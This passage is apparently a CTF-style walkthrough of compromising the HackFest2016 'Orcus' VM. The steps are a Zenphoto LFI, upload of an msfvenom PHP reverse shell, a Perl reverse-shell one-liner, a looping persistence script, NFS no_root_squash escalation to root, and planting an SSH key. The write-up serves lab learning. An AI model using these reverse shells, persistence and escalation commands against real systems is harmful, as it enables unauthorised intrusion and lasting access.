src="/assets/images/2019-04-15-hackfest2016-orcus/6A00E782-4A83-4DE7-A1FC-5C0BBB1A3854.png" width="1572"/><br/></div><div><br/></div><div>Time to login...</div><div><br/></div><div><img height="852" src="/assets/images/2019-04-15-hackfest2016-orcus/D690F8F9-ECE3-43BA-875A-5721E14869BF.png" width="834"/><br/></div><div><br/></div><div>Once logged in, I go to the Overview tab and see what version of Zenphoto we are running.</div><div><br/></div><div><img height="542" src="/assets/images/2019-04-15-hackfest2016-orcus/7138A516-8E32-43E2-AB70-116BC5861DA5.png" width="1058"/><br/></div><div><br/></div><div>Great, the exploit database has a known issue with our version.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>ZenPhoto 1.4.10 - Local File Inclusion                                                                       | exploits/php/webapps/38841.txt</div></div><div><br/></div><div>Using the proof-of-concept (PoC) code in the exploit database TXT file, I'm not actually able to get the LFI vulnerability to work. I try (which comes directly from the PoC)...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>http://10.183.0.220/zenphoto/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../xampp/phpinfo</div></div><div><br/></div><div>As well as...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>http://10.183.0.220/zenphoto/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../../../../../etc/passwd</div></div><div><br/></div><div>Both error out. I decided to try to download the Zenphoto source code to see what the pluginDoc.php page was doing and how to get the LFI working. After jumping through hoops on the Zenphoto website, I finally found where I could download previous versions from their GitHub repo.</div><div><br/></div><div><a href="https://github.com/zenphoto/zenphoto/releases/tag/zenphoto-1.4.10" target="_blank">https://github.com/zenphoto/zenphoto/releases/tag/zenphoto-1.4.10</a></div><div><br/></div><div><img height="714" src="/assets/images/2019-04-15-hackfest2016-orcus/07CA8CB6-4D37-4ADC-B785-CF3C44F306EE.png" width="2000"/><br/></div><div><br/></div><div>Looking at the source code for pluginDoc.php, the extension parameter is captured, "sanitized" and then a path is built using the parameter + '.php'. So, we have to target .php files to get the LFI vulnerability to work.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>[snip]</div><div>        $extension = sanitize($_GET['extension']);</div><div>        $thirdparty = isset($_GET['thirdparty']);</div><div><div><br/></div><div><br/></div></div><div>        if ($thirdparty) {</div><div>                $pluginToBeDocPath = SERVERPATH . '/' . USER_PLUGIN_FOLDER . '/' . $extension . '.php';</div><div>        } else {</div><div>                $pluginToBeDocPath = SERVERPATH . '/' . ZENFOLDER . '/' . PLUGIN_FOLDER . '/' . $extension . '.php';</div><div>        }</div></div><div><br/></div><div>That might be useful, but let's see what else Zenphoto can do for us.</div><div><br/></div><div>Checking out the Plugins tab in Zenphoto reveals lots of goodies. Of special note is the "Uploader" tab. That sounds like what we need.</div><div><br/></div><div><img height="1356" src="/assets/images/2019-04-15-hackfest2016-orcus/2D3310B1-4C97-485E-8858-524BCE2AB30C.png" width="2572"/><br/></div><div><br/></div><div>It looks like the two uploaders that are already enabled are only for images. The elFinder plugin looks to be more robust and even has some known issues (according to the exploit database), so let's enable that one.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# searchsploit elFinder</div><div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div><div> Exploit Title                                                                                               |  Path</div><div>                                                                                                             | (/usr/share/exploitdb/)</div><div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div><div>elFinder 2 - Remote Command Execution (via File Creation)                                                    | exploits/php/webapps/36925.py</div><div>elFinder 2.1.47 - 'PHP connector' Command Injection                                                          | exploits/php/webapps/46481.py</div><div>elFinder PHP Connector &lt; 2.1.48 - 'exiftran' Command Injection (Metasploit)                                  | exploits/php/remote/46539.rb</div><div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div><div>Shellcodes: No Result</div></div><div><br/></div><div>We can access our newly enabled Uploader plugin from the Upload tab.</div><div><br/></div><div><img height="1276" src="/assets/images/2019-04-15-hackfest2016-orcus/6A5C479E-1C90-4961-ABE9-BAEE40849567.png" width="564"/><br/></div><div><br/></div><div>It looks like the default location elFinder uses is /zenphoto/uploaded...</div><div><br/></div><div><img height="1320" src="/assets/images/2019-04-15-hackfest2016-orcus/B3EB1890-DDE9-4F86-A2F6-9DE1B568031E.png" width="972"/><br/></div><div><br/></div><div>...which we have directory listing available for.</div><div><br/></div><div><img height="366" src="/assets/images/2019-04-15-hackfest2016-orcus/8306E45B-57D8-4CF1-AD15-B486A85E34DB.png" width="802"/><br/></div><div><br/></div><div>Let's build our PHP reverse shell with msfvenom and upload it.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>No encoder or badchars specified, outputting raw payload</div><div>Payload size: 3035 bytes</div></div><div><br/></div><div><img height="846" src="/assets/images/2019-04-15-hackfest2016-orcus/3240817C-FD2B-4259-A94A-3DB5902084B5.png" width="784"/><br/></div><div><br/></div><div>Now that the reverse shell is on the server and accessible, we need to start our Metasploit listener. I'm actually going to start two listeners. One for the PHP reverse shell, and one for the Perl reverse shell I'll create as soon as the PHP shell session starts. I'm doing this because the PHP reverse shell will quickly timeout and I want a more stable connection.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 0.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div><div>msf5 exploit(multi/handler) &gt; </div><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div><div>LPORT =&gt; 5433</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 1.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5433</div></div><div><br/></div><div>I use curl to start the PHP reverse shell session...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# curl http://10.183.0.220/zenphoto/uploaded/rev.php</div></div><div><br/></div><div>Worked! I connect to the session and start my perl reverse shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.220:59382) at 2019-04-16 16:06:45 -0400</div><div><div><br/></div><div>msf5 exploit(multi/handler) &gt; sessions 1</div></div><div>[*] Starting interaction with 1...</div><div><div><br/></div></div><div>pwd</div><div>/var/www/html/zenphoto/uploaded</div><div>id</div><div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div><div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div><div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.220:57200) at 2019-04-16 16:07:13 -0400</div></div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>Since SSH is open on the victim, I checked to see if the www-data user has a default home directory and shell defined.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/var/www/html/zenphoto/uploaded$ grep `whoami` /etc/passwd</div><div>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div></div><div><br/></div><div>The home directory exists, but only allows writes by root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>drwxr-xr-x  4 root root   4096 Oct 22  2016 www</div></div><div><br/></div><div>The default shell is set to '/usr/sbin/nologin', so I won't be able to SSH to the box with this account.</div><div><br/></div><div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# cat thumb</div><div>#!/bin/sh</div><div>while true; do</div><div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div><div>    # sleep for 300 seconds (5 mins)</div><div>    sleep 300</div><div>done</div></div><div><br/></div><div>I uploaded the script to the victim's /var/www/html/zenphoto/cache directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/var/www/html/zenphoto/cache$ wget -O thumb 10.183.0.222:4321/thumb</div><div>&lt;l/zenphoto/cache$ wget -O thumb 10.183.0.222:4321/thumb                     </div><div>--2019-04-16 16:26:34--  http://10.183.0.222:4321/thumb</div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 307 [application/octet-stream]</div><div>Saving to: 'thumb'</div><div><div><br/></div><div><br/></div></div><div>thumb               100%[===================&gt;]     307  --.-KB/s    in 0s      </div><div><div><br/></div><div><br/></div></div><div>2019-04-16 16:26:34 (59.0 MB/s) - 'thumb' saved [307/307]</div><div><div><br/></div><div><br/></div></div><div>www-data@Orcus:/var/www/html/zenphoto/cache$ chmod +x thumb</div><div>chmod +x thumb</div><div>www-data@Orcus:/var/www/html/zenphoto/cache$ ./thumb &amp;</div><div>./thumb &amp;</div><div>[1] 21552</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>Several of the services we detected in the initial scanning were related to NFS. We can see remotely that the server has an NFS export for /tmp that allows anyone to connect.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# showmount -e 10.183.0.220</div><div>Export list for 10.183.0.220:</div><div>/tmp *</div></div><div><br/></div><div>Now that we have a local shell, we can also see that root squashing is not enabled for the share.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/etc$ cat /etc/exports</div><div>cat /etc/exports</div><div># /etc/exports: the access control list for filesystems which may be exported</div><div>#               to NFS clients.  See exports(5).</div><div>#</div><div># Example for NFSv2 and NFSv3:</div><div># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</div><div>#</div><div># Example for NFSv4:</div><div># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</div><div># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</div><div>#</div><div>/tmp *(rw,no_root_squash)</div></div><div><br/></div><div>This means we can mount the share on our attacker machine and use our root access there to create suid files on the victim and easily gain root access.</div><div><br/></div><div>We start by copying /bin/bash to the /tmp directory on the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/etc$ cd /tmp</div><div>www-data@Orcus:/tmp$ which bash</div><div>/bin/bash</div><div>www-data@Orcus:/tmp$ cp /bin/bash .</div></div><div><br/></div><div>Now, on our attacking machine we mount the /tmp directory locally.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# mkdir tmp</div><div>root@kali:~/Walkthroughs/hackfest2016/orcus# mount -t nfs 10.183.0.220:/tmp tmp</div></div><div><br/></div><div>Now all we have to do is move to the tmp directory, change the owner of the bash file we copied and set the "sticky" bit to allow normal users to execute it as root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# cd tmp</div><div>root@kali:~/Walkthroughs/hackfest2016/orcus/tmp# chown root bash</div><div>root@kali:~/Walkthroughs/hackfest2016/orcus/tmp# chmod u+s bash</div><div>root@kali:~/Walkthroughs/hackfest2016/orcus/tmp# ll</div><div>total 1.1M</div><div>-rwsr-xr-x 1 root www-data 1.1M Apr 16 17:38 bash</div></div><div><br/></div><div>Back on the victim...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/tmp$ ./bash -p</div><div>bash-4.3# id</div><div>id</div><div>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</div></div><div><br/></div><div>Why does this work? What does '-p' mean? From the bash man page.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>If  the  shell  is  started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no</div><div>startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE  variables,</div><div>if  they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at in‐</div><div>vocation, the startup behavior is the same, <b><u>but the effective user id is not reset</u></b>.</div></div><div><br/></div><div>As you can see from the output of the 'id' command, the effective user id (euid) is 0 (root).</div><div><br/></div><div>Now we get the flag from /root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>bash-4.3# cd /root</div><div>bash-4.3# cat flag.txt</div><div>cat flag.txt</div><div>807307b49314f822985d0410de7d8bfe</div></div><div><br/></div><div>To do some more digging, we will also add our ssh key to the /root/.ssh/authorized_keys file so we can get a nice shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>bash-4.3# cd .ssh</div><div>bash-4.3# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCVjc6rm8+ORrWgwf/6RjxhodRe2yTTih+gyI0apQOW1XJs3jzoQahnXMORD+nkBRd9Cg5xyT0LTCBDI/+qNbXb4V1jAKIiZiA6+ZQsXQYqf8aA6S6ElaaAehUWqlUzoixFWPBsGKOdGclhIlgS4nndho8fVK3fy260hy4/T/oM//fO+RkAjkPVDh42UU2S98QKR2meCtj8YDOi9t3Wm4PsEutaiYPi4sjtTNvaJ7Y2VRNy3jPqcs0bCDAhK5poNFxAS7FaL+/Kb/zsP5gF9WuvtGRzWJp7q+lOPYcfhN9cAKlxMKMxC/bGLuyGf2IOGc2VGekmwf6AOr86B6zMm6pT root@kali" &gt;&gt; authorized_keys</div></div><div><br/></div><div>Once we SSH in, we could also edit root's crontab to further "maintain access"... but we aren't planning to spend too much longer on this.</div><div><br/></div><div>Before we SSH in, though, it should be noted that we found SSH services listening on both TCP port 22 and TCP port 443. In the /etc/passwd file we see a user named 'kippo'. Googling kippo, we find "Kippo is a medium-interaction SSH honeypot written in Python."</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>bash-4.3# cat /etc/passwd</div><div>[...]</div><div>kippo:x:1001:27::/home/kippo:/bin/bash</div><div>[...]</div></div><div><br/></div><div>Also, in the /etc directory we see a folder for 'kippo'. Checking the config file, we see that it is set up to listen on port 22. Incidentally, we also see a "flag" in the file.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>bash-4.3# cd /etc/kippo</div><div>bash-4.3# cat kippo.cfg</div><div>cat kippo.cfg</div><div>#</div><div># Kippo configuration file (kippo.cfg)</div><div>#</div><div><div><br/></div><div><br/></div></div><div>[honeypot]</div><div><div><br/></div><div><br/></div></div><div># IP addresses to listen for incoming SSH connections.</div><div>#</div><div># (default: 0.0.0.0) = any address</div><div>#ssh_addr = 0.0.0.0</div><div><div><br/></div><div><br/></div></div><div># Port to listen for incoming SSH connections.</div><div># user:1:TH!SP4SSW0RDIS4Fl4G!</div><div><div><br/></div><div><br/></div></div><div># (default: 2222)</div><div>ssh_port = 22</div><div><br/></div><div>[...]</div></div><div><br/></div><div>Checking the running processes (ps -aux) and open ports (lsof -i -Pn), it doesn't appear that kippo is actually running, but we'll be on the safe side and SSH using TCP port 443.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# ssh -p 443 -i orcus root@10.183.0.220</div></div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** REMOVE /var/www/html/zenphoto/uploaded/rev.php ***</div><div>*** STOP /var/www/html/zenphoto/cache/thumb ***</div><div>*** REMOVE /var/www/html/zenphoto/cache/thumb ***</div><div>*** REMOVE /tmp/bash ***</div><div>*** REMOVE ssh key from /root/.ssh/authorized_keys ***</div><div>*** REMOVE /tmp/rev.php ***</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">Flags</span></div><div><br/></div><div>The first flag can be found in /var/www.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/var/www$ cat flag.txt</div><div>cat flag.txt</div><div>868c889965b7ada547fae81f922e45c4</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Using the Zenphoto LFI vulnerability</span></div><div><br/></div><div>Because of the accessible NFS share, we could use the Zenphoto LFI vulnerability to retrieve our PHP reverse shell from /tmp. That would involve mounting /tmp on our attacking machine, copying over our PHP reverse shell (created earlier with msfvenom) and then using the following curl command to access it.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>curl 'http://10.183.0.220/zenphoto/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../../../../../tmp/rev'</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">ssh-creds.bak</span></div><div><br/></div><div>In revisiting the 'ssh-creds.bak' file in the /var/www/html/backups directory, we find that it is just junk. The username/password combo doesn't work. Just another red herring.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Orcus:/var/www/html/backups# cat ssh-creds.bak </div><div>root:123456</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">phpmyadmin.conf</span></div><div><br/></div><div>We found a username and password in the phpmyadmin.conf file in /etc/dbconfig-common. We tried the credentials on the /phpmyadmin site and they worked. Unfortunately, as seen in a screenshot above, the phpmyadmin user doesn't actually have any db privs.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Orcus:/etc/dbconfig-common# cat phpmyadmin.conf</div><div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div><div># dbc_dbuser: database user</div><div>#       the name of the user who we will use to connect to the database.</div><div>dbc_dbuser='phpmyadmin'</div><div><div><br/></div><div><br/></div></div><div># dbc_dbpass: database user password</div><div>#       the password to use with the above username when connecting</div><div>#       to a database, if one is required</div><div>dbc_dbpass='sX6yATfXjVyf'</div><div><div>[...]</div></div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Adem</span></div><div><br/></div><div>The db.php file in /var/www/html/Adem contains more credentials. We tried the credentials on the /phpmyadmin site and they did NOT work.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@Orcus:/var/www/html/Adem# cat db.php</div><div>&lt;?php</div><div>/**</div><div> * @package Adem</div><div> * @version 0.2</div><div> * @since 0.1</div><div> * @category connect DB</div><div> * @author Fares AlBelady</div><div> */</div><div><div><br/></div></div><div>// ضع اسم قاعدة البيانات</div><div>// SET YOUR DB NAME</div><div>define("DB_NAME","Adem");</div><div><div><br/></div></div><div>// ضع اسم المستخدم لقاعدة البيانات</div><div>// SET YOUR DB USER</div><div>define("DB_USER","root");</div><div><div><br/></div></div><div>// ضغ كلمة المرور لقاعدة البيانات</div><div>// SET YOUR DB PASSWORD</div><div>define("DB_PASS","");</div><div><div><br/></div></div><div>// ضع مستضيف قاعدة البيانات ، في العادة يكون بقيمة ( localhost ) إذا حدث خطأ راسل مستضيفك ليعطيك الاسم الخاص به .</div><div>// SET YOUR DB HOST , default is be ( localhost ) 